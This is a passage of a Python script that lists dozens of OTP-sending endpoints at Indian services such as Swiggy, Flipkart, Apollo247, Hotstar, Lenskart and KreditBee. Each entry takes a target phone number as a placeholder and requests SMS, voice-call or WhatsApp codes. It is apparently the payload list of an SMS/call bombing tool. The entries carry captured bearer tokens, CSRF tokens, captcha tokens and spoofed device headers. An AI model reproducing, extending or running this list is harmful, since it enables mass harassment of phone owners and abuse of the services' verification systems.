            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9.",
            "Accept-Language": "en-US",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"PhoneNumber": "{no}", "PhoneCode": "91", "Domain": "Web", "CountryId": "IN", "IpAddress": "117.234.73.154", "CountryCodeByHeader": "IN"}
    })
    
    # 22. AstroYogi - Call
    apis.append({
        "name": "AstroYogi_Call",
        "url": "https://comm.astroyogi.com/api/OtpComm/SendOtp",
        "method": "POST",
        "headers": {
            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9.",
            "Accept-Language": "en-US",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"phoneCode": "91", "countryCode": "IN", "mobileNumber": "{no}", "platform": "Web", "IpAddress": "117.234.73.154", "requestType": "call", "countryCodeByHeader": "IN"}
    })
    
    # 23. AstroYogi - WhatsApp
    apis.append({
        "name": "AstroYogi_WhatsApp",
        "url": "https://comm.astroyogi.com/api/OtpComm/SendOtp",
        "method": "POST",
        "headers": {
            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9.",
            "Accept-Language": "en-US",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"phoneCode": "91", "countryCode": "IN", "mobileNumber": "{no}", "platform": "Web", "IpAddress": "117.234.73.154", "requestType": "whatsapp", "countryCodeByHeader": "IN"}
    })
    
    # 24. AnytimeAstro
    apis.append({
        "name": "AnytimeAstro",
        "url": "https://www.anytimeastro.com/account/registermobile/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"ContactMobile": "{no}", "MobCode": "%2B91", "trackingUrl": "", "ReferralCode": "", "reCaptchaResponse": "", "AcceptHuman": "true", "CountryCode": "in", "ConfirmMobile": "", "AcceptHumanenabled": "1", "captchaenabled": "0", "__RequestVerificationToken": "Iyj_j-I3vZHWeCuJ9PdDFF1yZqK3j9vCBb9YtXcD44UkzDahjHKmOR226JJC-nkOT_fLQCQ0IwMoVSiHdMHhaxRineJJYZh1X_bXSzDMukk1"}
    })
    
    # 25. Milkbasket - Voice
    apis.append({
        "name": "Milkbasket_Voice",
        "url": "https://consumerbff.milkbasket.com/graphql",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "Content-Type": "application/json",
            "authorization": "",
            "appplatform": "web",
            "appversion": "8.0.9.0",
            "binaryversion": "8.0.9",
            "hubid": "1",
            "cityid": "1",
            "role": "1",
            "mbexpress": "0",
            "mblitetype": "0",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"operationName": "registerNumber", "variables": {"phone": "{no}", "retry": True, "retryType": "voice", "appHash": "", "udid": "QZg2sH1J6vHLMwDK"}, "query": "mutation registerNumber($phone: String!, $retry: Boolean!, $retryType: String!, $appHash: String!, $udid: String!) { registerPhoneNumber(phone: $phone retry: $retry retryType: $retryType appHash: $appHash udid: $udid) { status error errorMsg otpBlockTime __typename } }"}
    })
    
    # 26. Apollo247
    apis.append({
        "name": "Apollo247",
        "url": "https://apigateway.apollo247.in/auth-service/generateOtp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "x-app-os": "web",
            "x-apollo-pre-auth-key": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZGVudGlmaWVyIjoiZjRhYjI0Y2Q2Y2NlZTJmYWY2ZTZmOTExNjA0NmQ5NTI0ZjI1NjVlM2EwNWQ4Yjc4ZjUyZjM5OGQzNmE4MDIzOCIsImlzc3VlZEF0IjoxNzgxNDIxNTY0MzU4LCJkZXZpY2VJZCI6IkRlc2t0b3AiLCJpc3MiOiJBcG9sbG8yNDciLCJpYXQiOjE3ODE0MjE1NjQsImV4cCI6MTc4MTUwNzk2NH0.gEZ0sUJVTjc2edv2-YVr4ejQabQP1z30HluS7ZZUURtdgZiBARRDASegcQyZX-mKH213BQbdh8LHYSfvwYkp0Fg8xHf-yEt3Mf_542-8fZXBtWmghgfuIQd8Z_4TrHy1EuAOMExJC3yj2meJdlSozkJV97t7IpPJsAqV1tjncQfJ5McNy0efVVYeGCgkrAP2EjrU9g1HuzPQzr2c588aw_xltTTEHIVCKgAAyZR8e9Noj25zYtEWSy8TSKUEqJqDTksFKNT3-0QiCSTmzzilD04JFrvRw0fN8tKvWWg6P2KpXR7QDH2BcY-fgUlJ4RCxF6EuYKPeSwR4vI8nzGawxw",
            "x-app-device-id": "Desktop",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"loginType": "PATIENT", "mobileNumber": "+{no}"}
    })
    
    # 27. BharatMatrimony
    apis.append({
        "name": "BharatMatrimony",
        "url": "https://greg.bharatmatrimony.com/",
        "method": "POST",
        "headers": {
            "apptype": "115",
            "sessionvalue": "01KV2GDFBZK0718YFRG5WCHTDG",
            "displaylanguage": "ENGLISH",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"operationName": "SendRegistrationOTP", "variables": {"input": {"motherTongue": "TAMIL", "registerId": 119702837, "registrationToken": "5a88de4e6473364a9d4f8dc32f5bb2af~IfJLlQLb3bw6Tr/PCXKXpyraj3wu8hJ7cDLLhUCkCQs=", "device": {}, "deviceToken": "WEB"}}, "query": "mutation SendRegistrationOTP($input: RegisterId) { sendRegistrationOTP(input: $input) { sessionValue status __typename } }"}
    })
    
    # 28. Jeevansathi
    apis.append({
        "name": "Jeevansathi",
        "url": "https://www.jeevansathi.com/app-gateway/auth/v1/phone/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "JS-User-Agent": "JSMS",
            "jsdid": "sggbf3c2DbiCd46UDYLinuxGoogle_MS",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"userId": "{no}", "isd": "91", "otpType": "LOGIN_PROFILE"}
    })
    
    # 29. Yatra
    apis.append({
        "name": "Yatra",
        "url": "https://www.yatra.com/social/common/yatra/sendMobileOTP",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"isdCode": "91", "mobileNumber": "{no}"}
    })
    
    # 30. Cleartrip
    apis.append({
        "name": "Cleartrip",
        "url": "https://www.cleartrip.com/accounts/external-api/otp",
        "method": "POST",
        "headers": {
            "channel": "PWA",
            "Caller": "https://www.cleartrip.com",
            "Origin": "https://www.cleartrip.com",
            "Referer": "https://www.cleartrip.com",
            "Authority": "https://www.cleartrip.com",
            "x_ct_sourcetype": "MOBILE",
            "app-agent": "PWA",
            "x-unified-header": '{"trackingId":"56b2207b-0b9f-46d4-bd49-e8dfacdf8550","source":"CLEARTRIP","platform":"PWA","deviceModel":""}',
            "Content-Type": "application/json",
            "expires": "0",
            "accept": "application/json",
            "cache-control": "no-cache",
            "ab-otp": "b",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"value": "{no}", "type": "MOBILE", "action": "SIGNIN", "countryCode": "+91"}
    })
    
    # 31. Swiggy
    apis.append({
        "name": "Swiggy",
        "url": "https://www.swiggy.com/mapi/auth/sms-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "fetch_req": "true",
            "platform": "mweb",
            "user-id": "0",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobile": "{no}", "_csrf": "3eux3tggHIFM-af_1Dssqu1f6xuveWY1yqrm0ggI"}
    })
    
    # 32. Snitch
    apis.append({
        "name": "Snitch",
        "url": "https://www.snitch.com/api/auth/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-CAP-Token": "81986cb3c6d6b7fd:021b93a18b7d0edf5b5f80b296ca0f",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobile_number": "+{no}"}
    })
    
    # 33. Snitch - Voice Resend
    apis.append({
        "name": "Snitch_Voice",
        "url": "https://www.snitch.com/api/auth/resend-otp",
        "method": "POST",
        "params": {"mode": "voice"},
        "headers": {
            "Content-Type": "application/json",
            "X-CAP-Token": "1d059f0c33c4d34b:868c9d763b60c83616551acdd002e6",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobile_number": "+{no}"}
    })
    
    # 34. SonyLIV - SMS
    apis.append({
        "name": "SonyLIV_SMS",
        "url": "https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "app_version": "3.8.5",
            "device_id": "3497a83d061e4b96b2dad39177ac29e7-1776169088769",
            "Access-Control-Allow-Origin": "*",
            "session_id": "2288862e9e344eca95e146997b2ef64a-1786124508031",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobileNumber": "{no}", "smsType": "SMS", "channelPartnerID": "MSMIND", "country": "IN", "timestamp": "2026-08-07T17:42:34.848Z", "otpSize": 4, "isMobileMandatory": True, "loginType": "REGISTERORSIGNIN"}
    })
    
    # 35. SonyLIV - Voice
    apis.append({
        "name": "SonyLIV_Voice",
        "url": "https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "app_version": "3.8.5",
            "device_id": "3497a83d061e4b96b2dad39177ac29e7-1776169088769",
            "Access-Control-Allow-Origin": "*",
            "session_id": "2288862e9e344eca95e146997b2ef64a-1786124508031",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobileNumber": "{no}", "smsType": "Voice", "channelPartnerID": "MSMIND", "country": "IN", "timestamp": "2026-08-07T17:44:15.343Z", "otpSize": 4, "isMobileMandatory": True, "loginType": "REGISTERORSIGNIN"}
    })
    
    # 36. ManMatters
    apis.append({
        "name": "ManMatters",
        "url": "https://api.manmatters.com/portal/auth/send-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "mwlang": "en",
            "repeatuser": "false",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"phoneNumber": "{no}", "source": "", "resend": False}
    })
    
    # 37. IGP
    apis.append({
        "name": "IGP",
        "url": "https://www.igp.com/v2/loginSignup",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"email": "", "mprefix": "91", "mob": "{no}", "cid": "99", "claimNumber": False, "newUserFlag": False, "verifyOtp": False, "otp": "", "isGuest": False, "isInternational": False}
    })
    
    # 38. Kredmint
    apis.append({
        "name": "Kredmint",
        "url": "https://merchant-v2.kredmint.in/api/auth/login/",
        "method": "POST",
        "params": {"mobile": "{no}", "partnerId": "", "productType": "", "clientToken": "", "programId": "", "sourceBy": "", "sourceType": ""},
        "headers": {
            "Authorization": "Bearer undefined",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"username": "{no}", "medium": "SMS", "meta": {}, "turnstileToken": "1.Y4lF4_kF4DZPijh3QGxr2LqBqM9RyhW1-z9CKgm-399Plkgy4faMshxKaJIzRZ2_7p9QxHMrcqfdS7TcsAx31JOPyqYd9lvj6Vrzm-_Y-SO8S9RMpd93jM7CPS-al2aq85zySTxBULA6YIlFDuCNby904mxmmnwBOvRCvqWULRn9C-cLorbHbry-k7fN7dfR8ZCE2aSkTOmRJhlmKZe_NfaL9wOA_nuC1ZgdWy5uGimKbNJz7q028fXucEZvMMn5tJfhjaxR12ZyXgq5K1VbQKQ-fXIp9WRvMd6S8F0Wi-CrMFA9tpeCavGghIL_wnQ8COyHo-RqxOxXofBsuczgy4VQ_RVwM4Iv9aPiVnS68xIerijMsugpRgj9DySqz0_re6583IR0HFV5ZiAYSQLE26D9WXhnlSyHV4R4EqDtxV7xQYDHrmBTMEL-h_3qgdzOGNZrMtsiHtzdgnOFwnEEKIQl55KKaD9QxIGzB6hdJfLs6R6oK13VBqSMGAQuP-MypvmSWz4X-6WOjbvsCqg5Dx4k2xgihgDzJSarLt8ViqylQIGJeFUYTZ4-_bFL4Y2dWTdHagvolYlR51-n6u_ltcmX3kdoDaB6SbpqkWh05jGS0x42W3UOxGUr8PTPL7Bp5QwUUA3Oept9iNM695vOdA2X8e4etzt4ETTe7w2GvoMa0g47X_B4neQ-53spGNIp.RhNi-8Xn1u2wamFaRlQfoA.eca3d52f2e64f7fbbfc37438773a17dbf34a79432848e8de6c7cd4773483d098"}
    })
    
    # 39. Codfirm/Clinikally - SMS
    apis.append({
        "name": "Codfirm_SMS",
        "url": "https://api.codfirm.in/api/customers/login/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-csrf-token": "Nr4fdJeJ-z4DMF6m8jeyEiGefgba7D3Ked38",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"medium": "sms", "storeUrl": "clinikally.myshopify.com", "phone": "{no}"}
    })
    
    # 40. Codfirm/Clinikally - WhatsApp
    apis.append({
        "name": "Codfirm_WhatsApp",
        "url": "https://api.codfirm.in/api/customers/login/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-csrf-token": "Nr4fdJeJ-z4DMF6m8jeyEiGefgba7D3Ked38",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"medium": "whatsapp", "storeUrl": "clinikally.myshopify.com", "phone": "{no}", "resendOtp": True}
    })
    
    # 41. Apna
    apis.append({
        "name": "Apna",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"phone_number": "91{no}", "retries": 0, "hash_type": "employer", "source": "employer"}
    })
    
    # 42. CityMall
    apis.append({
        "name": "CityMall",
        "url": "https://citymall.live/api/gateway/cl-user/auth/get-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "x-requested-with": "WEB",
            "x-app-name": "WEB",
            "x-platform-os": "WEB2",
            "use-applinks": "true",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"phone_number": "{no}"}
    })
    
    # 43. Here/HDFC
    apis.append({
        "name": "Here_HDFC",
        "url": "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobile": "{no}", "countryCodeId": "b43569eb-6798-43fb-8d27-47d55d7c544b", "source": "sms"}
    })
    
    # 44. GetLook
    apis.append({
        "name": "GetLook",
        "url": "https://getlook.in/login/v1/api",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"phone": "{no}"}
    })
    
    # 45. KPNFresh
    apis.append({
        "name": "KPNFresh",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST",
        "params": {"channel": "WEB", "version": "1.0.0"},
        "headers": {
            "x-user-journey-id": "9661355e-9713-458c-af2c-77bc414bc19d",
            "cache": "no-store",
            "x-app-id": "82f2bcd2-b3cf-4c2a-bc8f-29acc2068c4d",
            "x-channel-id": "WEB",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"phone_number": {"number": "{no}", "country_code": "+91"}}
    })
    
    # 46. Lenskart
    apis.append({
        "name": "Lenskart",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "cache-control": "no-cache",
            "x-api-client": "mobilesite",
            "x-session-token": "037dd571-5486-4d13-af40-f6b1854d0abf",
            "x-accept-language": "en",
            "x-country-code": "IN",
            "x-customer-type": "NEW",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"captcha": None, "phoneCode": "+91", "telephone": "{no}"}
    })
    
    # 47. Savana - SMS
    apis.append({
        "name": "Savana_SMS",
        "url": "https://api-shop-in.savana.com/n/api/buyer/basic/otp/sendCode",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Cache-Control": "no-cache",
            "vtoken": "3500810203",
            "x-source": "h5",
            "x-platform": "web",
            "h5-version": "5.6.0",
            "country-language": "en-IN",
            "uuid": "___X_2b4c4c68-bca6-402c-bd22-8dab31407bf1-1781320386574",
            "client_type": "h5",
            "app_version": "5.6.0",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"userName": "{no}", "type": 0, "channel": 1, "bizTraceId": "93d67a64fa6b4ca4bee136f9a2470d97", "phonePrefix": "+91"}
    })
    
    # 48. Savana - WhatsApp
    apis.append({
        "name": "Savana_WhatsApp",
        "url": "https://api-shop-in.savana.com/n/api/buyer/basic/otp/sendCode",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Cache-Control": "no-cache",
            "vtoken": "3500810203",
            "x-source": "h5",
            "x-platform": "web",
            "h5-version": "5.6.0",
            "country-language": "en-IN",
            "uuid": "___X_2b4c4c68-bca6-402c-bd22-8dab31407bf1-1781320386574",
            "client_type": "h5",
            "app_version": "5.6.0",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"userName": "{no}", "type": 0, "channel": "2", "bizTraceId": "93d67a64fa6b4ca4bee136f9a2470d97", "phonePrefix": "+91"}
    })
    
    # 49. Ixigo - SMS
    apis.append({
        "name": "Ixigo_SMS",
        "url": "https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "deviceTime": "1786121898683",
            "X-Requested-With": "XMLHttpRequest",
            "apiKey": "iximweb!2$",
            "ixiSrc": "iximweb",
            "clientId": "iximweb",
            "deviceId": "fa1deb39ff4f441796e0",
            "uuid": "fa1deb39ff4f441796e0",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"token": "0239bfc7bb3df5dc4bfb0553a58ae8d900c13e2e3a297c6cddcff5ebfc44b44e62d5f7051b24d93a0935f1911aabff78fd3a15b15d71ec9ed7539a331d295a4f", "sixDigitOTP": "true", "prefix": "%2B91", "phone": "{no}", "resendOnCall": "false"}
    })
    
    # 50. Ixigo - Call
    apis.append({
        "name": "Ixigo_Call",
        "url": "https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "deviceTime": "1786121934105",
            "X-Requested-With": "XMLHttpRequest",
            "apiKey": "iximweb!2$",
            "ixiSrc": "iximweb",
            "clientId": "iximweb",
            "deviceId": "fa1deb39ff4f441796e0",
            "uuid": "fa1deb39ff4f441796e0",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"token": "16df49a87cf210e360ffe104da4f8fb57c52bcc12dbb3d87b1e988861a294d5501aa2510a96afbdf0dd2ede402ad2f64c0f203d5db9f9f15ee491737dce77fa4", "sixDigitOTP": "true", "prefix": "%2B91", "phone": "{no}", "resendOnCall": "true"}
    })
    
    # 51. Hotstar - SMS
    apis.append({
        "name": "Hotstar_SMS",
        "url": "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8",
        "method": "POST",
        "params": {"action": "resendOtp"},
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "x-hs-retry-count": "0",
            "X-HS-Platform": "mweb",
            "X-Country-Code": "in",
            "accept-language": "eng",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"body": {"@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest", "phone_number": "{no}", "initiate_by": 0, "recaptcha_token": "", "source": 0}}
    })
    
    # 52. Hotstar - Call
    apis.append({
        "name": "Hotstar_Call",
        "url": "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8",
        "method": "POST",
        "params": {"action": "resendOtp"},
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "x-hs-retry-count": "0",
            "X-HS-Platform": "mweb",
            "X-Country-Code": "in",
            "accept-language": "eng",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"body": {"@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest", "phone_number": "{no}", "initiate_by": 1, "recaptcha_token": "", "source": 0}}
    })
    
    # 53. Happi Mobiles
    apis.append({
        "name": "HappiMobiles",
        "url": "https://dev-services.happimobiles.com/api/user-login/homepage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {}
    })
    
    # 54. VisitApp - SMS
    apis.append({
        "name": "VisitApp_SMS",
        "url": "https://api.getvisitapp.com/v3/new-auth/login-phone",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"phone": "{no}", "countryCode": 91, "platform": "WEB", "ssoInfo": None, "storedUTMParams": {}, "emailCode": "", "evId": ""}
    })
    
    # 55. VisitApp - WhatsApp
    apis.append({
        "name": "VisitApp_WhatsApp",
        "url": "https://api.getvisitapp.com/v3/new-auth/login-phone",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"channel": "whatsapp", "resend": True, "countryCode": 91, "phone": "{no}", "platform": "WEB"}
    })
    
    # 56. VRL Bus
    apis.append({
        "name": "VRLBus",
        "url": "https://www.vrlbus.in/Web_Methods/OtherWebMethod.aspx/GenrateOTP",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"PhoneNo": "{no}", "Captcha": "6yg78"}
    })
    
    # 57. Flipkart
    apis.append({
        "name": "Flipkart",
        "url": "https://2.rome.api.flipkart.com/1/action/view",
        "method": "POST",
        "headers": {
            "X-User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 FKUA/msite/0.0.3/msite/Mobile channelType/undefined",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"actionRequestContext": {"type": "LOGIN_IDENTITY_VERIFY", "loginIdPrefix": "+91", "loginId": "{no}", "clientQueryParamMap": {"ret": "/my-account", "entryPage": "DEFAULT"}, "loginType": "MOBILE", "verificationType": "OTP", "screenName": "LOGIN_V4_MOBILE", "triggerSna": False, "sourceContext": "DEFAULT"}}
    })
    
    # 58. KreditBee
    apis.append({
        "name": "KreditBee",
        "url": "https://api.kreditbee.in/v1/me/otp",
        "method": "PUT",
        "headers": {
            "authorization": "Bearer null",
            "x-kb-info": "eyJsYXQiOiIwIiwibG5nIjoiMCIsImRpZCI6IiIsImFwcHR5cGUiOiJ3ZWIiLCJhcHB2ZXIiOiIiLCJpc3Jvb3RlZCI6IiJ9",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"reason": "loginOrRegister", "mobile": "{no}", "appsflyerId": "06489c77-8f7b-4dd0-9c10-f673c161c6bb-p", "mediaSource": "", "firebaseInstanceId": "", "firebaseiosAppInstId": ""}
    })
    
    # 59. Dehaat
    apis.append({
        "name": "Dehaat",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobile_number": "{no}", "client_id": "kisan-app"}
    })
    
    # 60. Medkart
    apis.append({
        "name": "Medkart",
        "url": "https://app.medkart.in/api/v2/auth/request-otp",
        "method": "POST",
        "params": {"identifier": "9b7e16ca6422f"},
        "headers": {
            "authorization": "Bearer",
            "lang": "en",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobile_no": "{no}"}
    })
    
    # 61. ConfirmTkt
    apis.append({
        "name": "ConfirmTkt",
        "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput",
        "method": "GET",
        "params": {"mobileNumber": "{no}", "newOtp": "true", "retry": "false", "channel": "web", "domainName": "www.confirmtkt.com", "testparamsp": "true"},
        "headers": {
            "Channel": "mweb",
            "Content-Type": "application/json",
            "Version": "409",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {}
    })
    
    # 62. RailYatri
    apis.append({
        "name": "RailYatri",
        "url": "https://www.railyatri.in/m/user-web-point",
        "method": "GET",
        "params": {"phone_number": "{no}", "_": "1780590041610"},
        "headers": {
            "x-csrf-token": "X3dzFmb0XTO4hJPc10/+1IjAG0+N3Jjs35gPA4RnhryqQvrhN9ELrd0gihnuMXHBonIeRpgns7rtHhjrpNdZ+w==",
            "x-requested-with": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {}
    })
    
    # 63. HealthKart
    apis.append({
        "name": "HealthKart",
        "url": "https://www.healthkart.com/veronica/user/login/send/otp/1/{no}",
        "method": "GET",
        "params": {"trkSrc": "HM-LPOPUP", "forgotPassword": "false", "plt": "2", "st": "1"},
        "headers": {
            "plt": "2",
            "pageuri": "/",
            "st": "1",
            "device": "47ee60e1bcc9f80",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {}
    })
    
    # 64. PharmEasy
    apis.append({
        "name": "PharmEasy",
        "url": "https://pharmeasy.in/api/auth/requestOTP",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "x-phone-platform": "mweb",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"contactNumber": "{no}"}
    })
    
    # 65. RedBus
    apis.append({
        "name": "RedBus",
        "url": "https://www.redbus.in/api/getOtpV2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
